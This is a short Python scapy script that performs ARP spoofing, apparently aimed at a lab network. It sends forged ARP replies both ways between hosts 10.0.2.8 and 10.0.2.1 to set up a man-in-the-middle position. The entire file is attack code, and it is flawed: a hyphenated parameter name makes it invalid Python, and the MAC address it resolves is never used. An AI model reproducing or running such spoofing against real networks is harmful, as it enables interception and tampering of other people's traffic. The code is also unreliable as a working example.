import scapy.all as scapy
import time
import optparse

def get_my_adress(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet=broadcast_packet/arp_request_packet
    answered_list=scapy.srp(combined_packet,timeout=1)[0]
    
    return answered_list[0][1].hwsrc

def arp_poising(target-ip,poisoned_ip):
    target_mac = get_my_adress(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,psrc=poisoned_ip)
    scapy.send(arp_response)


arp_poising("10.0.2.8","10.0.2.1")
arp_poising("10.0.2.1","10.0.2.8")